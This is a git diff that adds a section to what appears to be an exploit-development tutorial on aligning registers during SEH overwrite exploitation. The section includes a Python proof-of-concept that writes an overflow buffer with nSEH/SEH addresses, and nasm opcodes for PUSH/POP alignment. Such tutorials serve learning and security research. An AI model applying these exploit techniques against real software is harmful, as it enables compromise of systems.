@@ -173,6 +173,62 @@ f.write(buffer)
 f.close()
 ```
 
-# Results
+## Results
 
 ![](/assets/img/Alignments/2.png)
+
+# SEH Overwrites
+
+As the Stack Overflows section has already been covered, it will now be proceeded to explain how alignments are performed within this scenario, which can be a little more complex, as the registers are not aligned by default.
+
+In order to perform the experiment, the same application will be used.
+
+Current poc:
+
+```term
+import struct 
+
+nseh = struct.pack("<I", 0x06710870)
+seh = struct.pack("<I", 0x10031779)
+
+buffer = "A" * 9008 + nseh + seh + "\x41\x49" * 5 + "\xff" * 200
+f = open ("poc.txt", "w")
+f.write(buffer)
+f.close()
+```
+
+Once the exploit is run, the payload is pasted and loaded, the debugger shows an interesting reaction:
+
+![](/assets/img/Alignments/3.png)
+
+Checking the registers, none of them have the exact value, nor similar. Usually, when performing alignments in SEH Overwrites, the EAX register tends to be used, as it normally requires friendly characters, and is a non-volatile pointer as well. 
+
+In order to perform the calculations as intended, it must be zeroed. The best way to do this, would be to copy the value of EDI, which is zero, to EAX. The instructions required for this operations would be PUSH EDI, POP EAX.
+
+Getting the opcodes for the operation with msf-nasm_shell:
+
+```term
+nasm > PUSH EDI
+00000000  57                push edi
+nasm > POP EAX
+00000000  58                pop eax
+nasm > 
+```
+
+Once this is done, it is posible to proceed with the calculations.
+
+There are plenty of methods to align a register. However, a good one to start with would be copying the value of ESP to EAX. Furthermore, the address you desire EAX to be aligned is substracted to such register.
+
+Getting the opcodes for copying ESP to EAX.
+
+```term
+nasm > PUSH ESP
+00000000  54                push esp
+nasm > POP EAX
+00000000  58                pop eax
+nasm > 
+```
+
+After the 4 bytes are positioned after the padding, the debugger reacts as intended:
+
+![](/assets/img/Alignments/4.png)
